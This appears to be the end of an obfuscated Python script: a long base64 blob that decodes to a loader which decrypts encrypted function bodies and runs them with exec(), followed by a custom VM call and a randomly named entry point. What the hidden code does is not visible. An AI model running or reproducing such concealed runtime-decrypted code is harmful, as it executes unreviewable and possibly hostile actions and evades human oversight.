0K3Iwa3NYc3dJQXZRc01vY1ZwK3VUNjNrZE5zaEN0Y0hlNXQzZVcrbjJld3VDeWltWmNHSldvRHFQWkF4MmZXRmFNRUZNTUdhdTVKVnFqR0xxWHBYN0ZGbzdwWFhXbUEyZzYvVTQvQ2JpOUt4dDlsOGFoMWx2Z1BLZ1lGbkkzQXRSSDlFTkFXeHZWMFo0UzZBZ0N5dFNCWTlQbmh0anFsTGpBLy9mUm9RNFljaFlNbzFRVVFwWExvdHordk1BOHlOV295M1ZpV0x2RXp5ckJTMjZPRjdwdFhFUUlXaUJXQTVCdlNOU2V5REJnbGo3WjBZaFJ3N3NubEJQcldRQjRsMmExNWNncGQ2cTZGNXUyOXlFWjNDVWVMazRJSkxZZlVRRmdXbDNiUVhyVm1GMkNSSGhmdkRiR25iQ0hTR1NHNEF4YmF5V2F5clAxOVFCYWFrVmJYMW9sU29qa3dscDY0OHpHNDdFSEduWUpBZnVmU3VkSVlzRTZOZm9UR3RHZUdWZzhjTDdtSm9vRCtLS1MwdThqdnRrWlNMNlVzRGdiaDlvV0ZWQWZubUwyc3ZBOEcrK2VvUllQQmlyUC9vZVVxWTRuZDBuUGRpc0g5VXZ4TWEyNDM3cWZhQUxNcG9VZ29lb1l1NE9Da1ZpenQ3Nm5ZdkZIM2tCT1ErWkxTeWtLcEZDZWVZV283aWRCMHl4OGM4YWZDVmJWK3l5MjRKejVXNUxIaytUWGpKVE9QYXdUbjBFRGtVNjc3MVpObFdHUnlOMTVod3hjWjIxWnJOMEE4OTJPRVB2TTRTOVBOYXJjbTlnM3RINXY2dzgrYkFrTjB3c25USzZXKy96U2RabFJ2WG93NTBBdWltNjdpUFZJSDlWanFsRzk1L0RCc1dFdFVHNlFVTXl2L1VRSkdaQUFZNitNTHBoa1lPd0t0bVB2Tk8xbWpFbzVKc1o0RTNRZ2NsdEVQRDVtT0RBZkUveHZxK3lzQTFwK1BiYk14bHNWL0RiZnJNa1F6aFQ2MFdRcjZnTzBlU3ZEemtIdWxaZUQ1YzhOMFlaM1hnMlk5aUdkOStKNVdNUlpOK29xVVBYYXJyd1JKQTdhcVJzSDF6QTZ1NWxBOGYyWGpQQWo2WVBZdWI4KzVKOVhJdTdVdllHdFVFZWpSYjM5R05TYlFZSHZHYXQ2VXZrSXN5Vk9jQStPUlplek93Lyt0cVhkM2FtekNJb2EwQjNyVFJCSmhveWFwdmRFOXRIOVUwZmo0WVAvWGJlTzlEd09MQldxNWVVTzNqZTdUaXF1QXBiMUN1OUNMQnpjWHQ2eFdXb0ZwK2ZUajRTY2dDM3BDYzhLUGU0Q2NPUzVzeDl5VHhtdzd2NFBKS2NBa1JMY3JZd0JIL2RsaUwwVEZHcXVQNElQYWRxaGdRcG9hOUVuNVpMYzZ6Sk1XMlVhdzd1MGpOM1hGeVJtSjRqK21yNFRIMzNYWE55MGVjbSttTFlyclFGK0VoL2R2dG9Fb0FiTXNVOEhIOTNIRE92MDVySnBXaE5GeVZ2d2JybTQ3Zko1UkkxWlMzeHVIQTBLNFQwRXBxVjB3WkVoQktKTDlYa2VKV0pIRmIxZEtHdStIUTFnVXFkVjdOdjh6UFhRcU1vK2xpUVExK3FqdUcwVkVRMkV0NUNLQ2U1YUF2S2dUc2VGV0NhZFQwcjdPTGE2TXZyZ2VvQlNjTFdaM1NjWXZlKzNMWHd4WWRLak8velpsTHp1dWJGU1ZTbjlqWnREcnhaMWl6dWd0V1RLTjlXNE1zQjhrZSt0QzQxR29QYlFveDZyRUxyOVNwQkNwSjhzcEJSbHZGTGhyUzkreGZsOFpDRStGckdGQllNL205T0xVMUdzZXMyODU0dXB1U3V5NjRxU0h2MGQrSFNkVjVBSG9KaFkyQzhwbjEvanV4TDBBRFo2SlZqMENrZG9MSURUL09heDQwYUtiOUFzc2R4aUR3MldidDZVVHdxeGRVRys5djFickUxRDFsVEMyVXdEeU5HSlRubCtrZUZpNHdZaURLUTdQb0hWczh5aG9YQWw3b2FBZWhZaHFwd00ydms0M1pKYjRRaXVWbmw5bzNyNWNpR2xnNGtGSXFiWXo4eE96TCtJMG55RVpPVU53SDQzZ3VORUVJMFdQUmNLVjZJVklWeTBYc3J6QTVmM0lRWVBoQmg0Slc3ZlUza2ZZWXczUStLS2dvMkxGL0FxbUl5ZkJKc3BUbk1RTmFyQXpIV0lnM1lIcWxrSnBmWFYwQTdGQW1CNVNTQmY2emZMZ1NGVEJFaTRjMytVQnZUejMweUsrY3YrY2NKNlQ3bURkUmVuKzA2aWpseFd4R25abmJ1Y2RZZ0FNUUVJR2l4Vmpxc1dveFdaK3NyaElRUjNRK0VDZzlEYjgvNkNSOWYyWFUvN0E2aFRkNDU0Y2p2SzhHNFFLcjRoZG8wT0hnc1dib2NpU25hRmJJREVhK3VDdHY3dS8wSTZTWVo0MWNIL3dwNERGdWdzTi9vUFNjdVVITUJrN0VqMzVodGpoem1icFVFYkhOaW1vMkZMbDR2YXllMHRiaHNQaC9LTlFYOWlxYnZJVDhhR25nNm5ydDRNRjVlL3R1V1RveHNlbU5FMjltd3BuTktWS2o0OG1IZkdOVnluQ2h6eDhBUGdVbVUxY2FLTDB0K3BwbmtUaloxNXdlSW9LSXc2Z1dnT1BkZWMxdXJBd0FKSGYwVEZXQjR3UkQ1OEs4OEVJS3g5R2txN3FveDFtVVhKYmExWmJNNEtDN0JPTU51VkdBQjJkaFRGZjErSFA0Y0taVU90aVpDdklyZnpFMTBuMUNIRE9sTWVSbHhBZkI2TlFnY1VXUGcxSzVnUlVNalJic2ZTSUZMSXgxVWo3NG5zUDJCRGk5cFpQVE1jWDhkNHJUWXlHaVhzYXgxU000L3N0ZG54d1NJMzNsenFVNWF1eTF1a08yajNVRFB4Y2FjbHhQTFZ4ajhXaGJ0bndMeUJHUnR6bklNbG1qMnQwcVZGOUNhNmdySVpQL09Za0xjRnI0UW42UG1sa1BGTm1DREV4UFNoRzRIbUIrWklyVjVCdWhuV0k5bTM4S1JhQTFQK2xmYmdNUGVKd2wxZWdaWVFDS21iWlFKdkI4ZFRXRDVYY0h5enVZTFZZb2x0bHlER3RsbHE0L3dva0FsT29YaDk2Szh2b2k0Ymk2VXRmMXcwaTM3NFhXT3pGU3gyMkxhdlFOQlZvbDJ2Y3dYOUVCZDJQSHBzVW8vMmVOTHZDWkNNdXo0MnYxM0UxTzMxNDNKUXIyenRVSXZvbllJSXh6UVU0UlQ4MHhhVmMzbzFsbWRFenVQdzUwUDcvbWRrcGtmNEJLSE9vR1RDemVDSkl3S3E3aldGamp2S0JNaG5TNWIxalRiTU92eURzcjhoS2JTSXhCQlA1YW5ROUEwOUxRaG5UOVR4d0Q2bk9XdTc5TFZpbWpHU0wrZXhBUGl0SXBwOStXZmZ0TjcxcUhuVW1zcmpyMmdLei90RXV2dFdwMk5XejJteHd4blFjQjcrRlBYWTNmTTN1UHliZW80Sm9iNjFGOFcrTjhCSWZaV1hmdEIzdnZidWlkWHhUQWtobllpK0x6MzJvMklnNlFZV3hkbklpbm41cVdPQ2o3a3lBRGlSSG0rZm00cTZreGRuaG9yRmk1RlE2Njl5Wm8vazNPUVFoNnhBKzB5VmNyOFkydnVFOG5vMzBwNmlRM0x4OWgrL1JtY0dLKysxUnRUMGNoeTVscVB2TW1Ca0pRV1BuSFpYUEw5UnZiR2g1WFlTZVhyUUlDM1laWC80ZU8xNFozc1hWQWZhWFRVdy9vYy9lZE1LM1VjQ2F4MWdZVTN1cnJxaDNBRitmMzQrRCs3OEorNVFsSTErcUVpNWxxTlJ1TlRBblRCS3BWOSszSUg0VERjZkxhaUZQeDZWVEFZZ20zNkk4a1N0R3N5aHh3Um5Qd1lSK0thdnhXYWx6NWFzOE92ZHhETWF2VTRPTDlXYngxRktpeUtvKzhISEx6ZXlHRFE2eGtDZjN4ZVd1all6ckQwbUhsRXlEMWhwcURSRS80WHZWM0hEL01KNzZGdXJOaDkrazFpRThhUXpSRGZqL3JVQ0tJdXVOdVdlR1BkMUZySEFSYkJuSUtXMnJmVk0vdWtyYVFhUWdwZG5rZEF2NThEQTJLdkdTQmtVekdmaStTbktuQUVYdFI3TkY5bHVUcTRRa0tHaTdoV1ZLU2prbXAwbkIvbnBhTWVCb1g3MlUrUi85bnpvMG1ONFRFQzJ0L29pVzNyTGNtTC9RZkhtWlJuR2hSdzJpV3l4c2VwVG9RcFRrVy9TdE5sYWZVSVY0VXkvczFSajB5dFd1Z1krMUR2d2M4WldBZ2tQNTJDMHQvQklwRnpXNEx5RVQ0TGFKSHNhRGdQbm43R0ZJTWVQeWxWWHczS292S0hBOHRIWE5tRmhqS3ltNGtLTHhBUzBheVYwdFVsMDhtcjBoSDBnUkQvY3VJSldnT3VHSGFkODhKK2VlcWdqOUYxRHpkS3U2cjcrRUU1RG40bHducXB6bXVrMVRSdGxCL202U0xTRHFka3didW9RaHRuMnhXL0dLMS9FZEwxdDEyeExqdnVKaVBRUVRQeTRJU2Q3eTZjWWhvUHZLeHpZYk1qSDhkRGVwTTlUTjJEdnNtOXhkYlV2RUJFdXN2bDIwbGd2dEFVazJaamE0NzlkY1BYU0lrdVNBcFRyRDdOQStiMmI3UUlTUldYWWVvTVVFU2RraEtZaDFIeVIvSytpbWljR2FHNTYyeG5sMUhrRmxyd1BEbzlENysvS2pBTGhOVEswZEx0QmI3NnlvQUxldW5IOTBzRkpTUXJvOG1wbEtxK0F5L3VnOGFES0xEM0JpalI3YVpGYnI5RUNEeDJucndSYkk4SkxwazRqTk9wVFFXREFGMWJtb2VDQ3hQY2hPNWNkd1BjRVZMc1lmZldTQW5SNzUra2pZbWtheXk1WGdLbjVoakh2MmkySnZBeHFzbm1TYUJTdEFXU0NEb2tEVkdnR3p5bTczZzhkSkRNNGZLdW9wR1NGd0NWNXpJU2p3NGRublNTcWFRSEhYSVlNYzllS291VFNxVVkvQzBWbU8yNzV6RXZlY1FJWmUrQ1FmTFhOVjRmSi9SU3dES29oL21nR3V2TkxSQzdNaGFDNmR2RFZTdmMzWkJjTGV5dHlnamtkU3luYXVYSlJCWXdKN2pOWWVBQnIvYjEyZ3Y0MWVYalJoQ1ZIdkxnNm80L2xTTXNtSDlKa2xvaDN0Ykdxd0lIamlFcUVOVEdIVjlQL3dzWGFXbnhWbktBVnZTWDAwNUxxTThGWXhrc1hlWWp5ZlVRdnlPdG9wTWp4Y25MRlRxbXNpMFlKZFZRdkF6V0Y3TnFuRXNkdGpkNit5cEs3NnFDQ3pnSjVkZmlEa3JPMDIzT3VDcmVnWmlub2N3ekNhbUFuOWxSNytjbUtpTXRvYzlaWkw2YTNrQ3EwVHhTd0ZVd0o1bTFjWmpBc0lveDB2ay9VeGVydWRzT0diN1RxZ1J4NTIwRE1RNFg2WTNiMGZYZkw4dWh6V2Nzb3FJbkhXRjNVeS93MzRWK2JCZVhnWmJkeThVNzFpRGV2RGM2Rldpckpsb1kzMjNxSDVsY2RUUWFTYjl2aVdYRkNPRVRjWnNzaXMvNlJiL2UyREdpNStZVXlZYmFnbTVza2JkRkw4SUY1cHAwVkRUMFZ2dFIzaTZWNEpsdE5xSnhRNk5VMERqNlRNc1hpMlNNRUZpSE4rS1J5UmtDMEM3WlJYOWxUUkJhYXFvUzlIekRHdXdkbjkwbDIyUlg0RDZDTVIvd2tJTkpOUHBwalRFaWVDdWd3enZENnhxVERWWVN2R0tVTWZQNmIyN083OFdQWGt0NWtibVdEOEd5cmsyU1FBNnpqN1IvcUU5eTI5V2ora0NZN0tsYW94K0hvdDBsdHJ3WWlMeXp5dFlZWWF4MENzT0g5NnZZaHBXZUNnSEJURW9lTnJ2eEZtUTBzeWpudk1HQnpmTHFtMk16dGpjY2FwcEwxWDY0SWdhVXZnVXcrN2tqYnB4cm5QUW5EZmpLY3hJOGkxdnZ4b0FyT3crc2dQdkszN3ZrRDdUUmUwN3JxVGxJK2lSS3J2U3hkWk5DUnhUbzRBOTBRUTJQNjFYU1czaDFWKzJTa2xiVmEwWFVOcGdJUFFJUnMzU2xDMFpQSEU5TU1pQVFFYTZtTzFhS2pTZXk1REN3S0J1ZlNLT2h2Sm9ZSFdNazFtWjhrcDczY0FvOVhhR2ptSmEwZmEycTFuLzBRb3Q4TjFmYi9TZnBORlJOT1VET01UNkUwM1BFdSt3YnlISDdRMGkvTDltV2NVaXdDN2JCOERLeks2TENKRThoUER3V1lXRkJORFB4cVNsdEpleUZXQlRYTXpib1ZOWDlncW90L1hrVHNSYUlRUWhsWDE3VDVsUzVjcVJ5OTlGWWRPazFqMWdzWFVDcHlZZ1FqZ0VpVCsvWTU3MjNxUDJ2b0J2T0NFcnc5YUxKcHk1c0wvWFhMb1lGbUdHYUhjeEpPZVlkL2NCMlNQR29qZkN1cTNnSitHSHMxaU55N3BHMWM2ekF1bTVKZkc0SVJpeHd4ZnhaQ3RGS0pHeU5SOUlJdzZrQ2F3cjJYbU8rb3pnRlErODVuNE15YlYxRnF6RTgzOS9wQ1JsNGkzNWdOM3NIcERHWGVDaVpvTkM4MUxYNStVaGVwV0FyUTZxSkx1bnZMalk0K1ZLUWZ6bVF4V01BelEwRzRPSEtva3hlNnJNK3VOdVVwbXFWbis5K1R2UXNWZVRKRHQ0RFV4d00yd1NhWXdieFA0aDVIVUxPNHRLZmU4bWNPN2JMdU1acGw4STkxalh6UHFSMTZvR2NQak00eEhGS2JUcm4vSkgrV0tNK0xIVHIwZVlPQUVGZ2I0MHd5blRpNEs4aEpmQXpnQ0NnUEhtOE1Icll6Zm5aYm1LSGdlOGhYeHR3QUt1TnloN1BXSUxLRHFnVzY1QjgwdE1xTDBYY1pFVGJXQmhuOU9GS1dtTE84aE5VWEh1eURxb3dKbnFLSmpYSmpYQ084K1RMc21nemdSN2lrV05LQWYxZk1sdEJQaVF2UlhBVFRKeWVkbHBnK2M0eG9ibFN0MWJIT0M1TU9YVFQrcWNrU3N2bDBtQXpuWTdiVEFLVCtLUlRKVDZEeTZma2tMWGE4a0dXd2p6cHNDMGZwM04zS0k3cnZ5Qnk4ZEp4SHFEd2RWaU5qNGRpNWY0czVtd2hod0RnSnozcnVTUHZQR01zdk1KYmNGcTdrWVNMVThEZmJtazd6bjBGL1J0VzcydmFIYUdZTVE3OUdwbjl6K0p0YnNFdXpSRXQ3Z0dSQzNRc1RrZXpHTmRoU1k1YnE5M1FpZHdVYm5VOFIvaWJQMUVEZk01YmtWWWFrMnNHZnBERmZRbmlINjRFN2xKWGNycjJabDl6ZWZGU1NMUTluZjBDRm1Nbll4UUYvU2k0UDNaRnF0OFVBRHNUQ0ExMEsyVGVTRGo2WnBzRlVhbmZlYjd2S2liRkpISzBqczNNRHFMZ1UxVTVXU3RVVmZiY0Q2bXVmaGZmWDFabU11RWtuQmhQWERHQ1FaMFZkRDFCUVJrbHpVd21HQWdvS0pxRFRma2tVVmUzazVNS0o4RTBXdFhRZ3VTczcvQjllVjI0S3dpS3ZlaW5vYkxkOGc2NENuWFErUjU3UmZ2WHFsaVB4d04rTGE3YlhRaC9wbG9abkVZR1preVhscVVQNGhMNXdmYisrOXZNTU1SdGlPdU5tYzVMTnoyMVBId2hLVWxzMDVaUFlFejVNTG5qNW81MGxIUzBvck84QVhBMmxMUnVtTlB4aWkrMzRsRFRianpnU2NVMFh5ZThNNFNGQXVHQVEySWtHRXRkcXd4SUxQVW9PYTVhdEpmWDlRKzhucFY2emdLaldIT1VVQXk5RnVUUkMzWFZNWnVZSzVkU2o3NEwvWUhqU0tWelpMdExrZDFxRXR4aEdQTnQ3MHo1eDhpcXBnWGRuVWtsUm51a0cxUmE1MjBiLzdndkpZSzZSUEUvT0lZSG1XMHdkQVpUR08zZmxvWHJ1Z0k1VktuUlZiSFllZUM0YVo3UkIzTnFQK1JBeTBEVENiNHVQVTNicXFyOWJJM1BwMkVOWm9JZndmelZJcEdtWE9qSTFBN0NiMTBhQjV5SE9GNmlmbCttM0haVE1rZlJueHAySUN2bUNoL3I2enltczViOTFabXN0S0lodytRc0kvdlRzYTRqekkyZC82SEs0ZkcrNkJTdDJjeXJHSmpFOC9wVWNFVmJxTHhLeUFuYzBmZHM5ellocGJyWCttWHRmUHZPYysvQnd1ZUpBME9nVVR5bkpPVUpGQmRlbVlBdnMwYmprT1JHVWM4bEtHd2JtTk1aMnV6VjVMZ3Y5MFZ3RFR4ZTF1V1NXL3RNbFVmL3JCZEJ4alZBMkQ2ODcvS2pqRXVsSjBWaU0zaVRPSkIwSFVUR29uYisyWGxKdmJ1QWZoSnVJdjJBeENZY0k5ZXp5dDdNaWpRUjAyQVlXTVhheGhzTTAxaTN3Wi90enN4NktxaUFCRTJrREJoM3h2Qm93MHRTTmdnemdyaDMvTDNVVWRuR0xJSGJUditHZ2dGMTZTUkRqZWJleGcycGNONFJ1V0oxWXZtV05NL2lhTkRJUEtSOHZvc2QxdEFwdnMzMWE0QlRHYXQxY1pjcVpFMDFyQnIrU3R2T0ZqOEg0NXRoZE5QcjNLNlB5cjJ3SVhCeHlseWdLRE03WE1tSjNzbWt5S2RXenJYRTRabDlzTVFSMllUUngySmNRTE5BQk8rMVhsQ2xPMzdrTkkxQnNLOWFjYm1EanE5ZFFITng1MWl2NFVYSXNQWllydGs4RE5tbHorQSttblk5TUlxckdkYUNaMjRQVFZuR0xGekxLZ0JuUkhKaVBNYUFEYmxyMEpyZ29RcmdNNlNucXJrc3VsTU5vdEpQMHVzcWxWb3EzTTVWRHQyZXVKenM2VDlnYlBEOWJqbmZYOGxXWmE2ZlRnZ0c3UU9zczhtUG94TG91L252bE9LWk5walU9JyldCl9GVU5DX0NBQ0hFID0ge30KCmRlZiBfZXhlY19lbmMoaWR4LCBrZXksIG5hbWUsIGFyZ3MsIGt3YXJncyk6CiAgICBpZiBuYW1lIGluIF9GVU5DX0NBQ0hFOgogICAgICAgIHJldHVybiBfRlVOQ19DQUNIRVtuYW1lXSgqYXJncywgKiprd2FyZ3MpCiAgICByYXcgPSBfRkVOQ19EQVRBW2lkeF0KICAgIG5vbmNlLCB0YWcgPSAocmF3WzoxNl0sIHJhd1stMTY6XSkKICAgIGN0ID0gcmF3WzE2Oi0xNl0KICAgIGF1dGhfa2V5ID0gaGFzaGxpYi5zaGEyNTYoYidhdXRodjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgaWYgbm90IGhtYWMuY29tcGFyZV9kaWdlc3QoaGFzaGxpYi5zaGEyNTYoYXV0aF9rZXkgKyBjdCkuZGlnZXN0KClbOjE2XSwgdGFnKToKICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoJ1tmdW5jZW5jXSBpbnRlZ3JpdHkgY2hlY2sgZmFpbGVkJykKICAgIGVuY19rZXkgPSBoYXNobGliLnNoYTI1NihiJ2VuY3YxOicgKyBrZXkgKyBub25jZSkuZGlnZXN0KCkKICAgIHBsYWluX2J5dGVzID0gX3hvcl9zdHJlYW0oZW5jX2tleSwgY3QpCiAgICBwbGFpbl9zdHIgPSBwbGFpbl9ieXRlcy5kZWNvZGUoJ3V0Zi04JykKICAgIG5zID0ge30KICAgIGV4ZWMocGxhaW5fc3RyLCBnbG9iYWxzKCksIG5zKQogICAgZnVuYyA9IG5zWydfZiddCiAgICBfRlVOQ19DQUNIRVtuYW1lXSA9IGZ1bmMKICAgIHJlc3VsdCA9IGZ1bmMoKmFyZ3MsICoqa3dhcmdzKQogICAgcmV0dXJuIHJlc3VsdAoKYXN5bmMgZGVmIF9leGVjX2VuY19hc3luYyhpZHgsIGtleSwgbmFtZSwgYXJncywga3dhcmdzKToKICAgIGlmIG5hbWUgaW4gX0ZVTkNfQ0FDSEU6CiAgICAgICAgcmV0dXJuIGF3YWl0IF9GVU5DX0NBQ0hFW25hbWVdKCphcmdzLCAqKmt3YXJncykKICAgIHJhdyA9IF9GRU5DX0RBVEFbaWR4XQogICAgbm9uY2UsIHRhZyA9IChyYXdbOjE2XSwgcmF3Wy0xNjpdKQogICAgY3QgPSByYXdbMTY6LTE2XQogICAgYXV0aF9rZXkgPSBoYXNobGliLnNoYTI1NihiJ2F1dGh2MTonICsga2V5ICsgbm9uY2UpLmRpZ2VzdCgpCiAgICBpZiBub3QgaG1hYy5jb21wYXJlX2RpZ2VzdChoYXNobGliLnNoYTI1NihhdXRoX2tleSArIGN0KS5kaWdlc3QoKVs6MTZdLCB0YWcpOgogICAgICAgIHJhaXNlIFJ1bnRpbWVFcnJvcignW2Z1bmNlbmNdIGludGVncml0eSBjaGVjayBmYWlsZWQnKQogICAgZW5jX2tleSA9IGhhc2hsaWIuc2hhMjU2KGInZW5jdjE6JyArIGtleSArIG5vbmNlKS5kaWdlc3QoKQogICAgcGxhaW5fYnl0ZXMgPSBfeG9yX3N0cmVhbShlbmNfa2V5LCBjdCkKICAgIHBsYWluX3N0ciA9IHBsYWluX2J5dGVzLmRlY29kZSgndXRmLTgnKQogICAgbnMgPSB7fQogICAgZXhlYyhwbGFpbl9zdHIsIGdsb2JhbHMoKSwgbnMpCiAgICBmdW5jID0gbnNbJ19mJ10KICAgIF9GVU5DX0NBQ0hFW25hbWVdID0gZnVuYwogICAgcmVzdWx0ID0gYXdhaXQgZnVuYygqYXJncywgKiprd2FyZ3MpCiAgICByZXR1cm4gcmVzdWx0CgpkZWYgX3hvcl9zdHJlYW0oa2V5LCBkYXRhKToKICAgIHJlc3VsdCA9IGJ5dGVhcnJheSgpCiAgICBjb3VudGVyID0gMAogICAgd2hpbGUgbGVuKHJlc3VsdCkgPCBsZW4oZGF0YSk6CiAgICAgICAga3MgPSBoYXNobGliLnNoYTI1NihrZXkgKyBjb3VudGVyLnRvX2J5dGVzKDgsICdiaWcnKSkuZGlnZXN0KCkKICAgICAgICBjaHVuayA9IGRhdGFbbGVuKHJlc3VsdCk6bGVuKHJlc3VsdCkgKyAzMl0KICAgICAgICBmb3IgYSwgYiBpbiB6aXAoY2h1bmssIGtzKToKICAgICAgICAgICAgcmVzdWx0LmFwcGVuZChhIF4gYikKICAgICAgICBjb3VudGVyICs9IDEKICAgIHJldHVybiBieXRlcyhyZXN1bHQpCgpkZWYgX2IoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMCwgX0ZVTkNfS0VZLCAnX2InLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2UoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMSwgX0ZVTkNfS0VZLCAnX2UnLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2YoKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMiwgX0ZVTkNfS0VZLCAnX2YnLCBhcmdzLCBrd2FyZ3MpCgpkZWYgX2coKmFyZ3MsICoqa3dhcmdzKToKICAgIHJldHVybiBfZXhlY19lbmMoMywgX0ZVTkNfS0VZLCAnX2cnLCBhcmdzLCBrd2FyZ3Mp"), '<exec>', 'exec'), globals())
    _vm_run(_c, _k, _m, globals(), locals(), _map, _ok, _ht, _pf)
if __name__ == '__main__':
    _jwfupfmc()
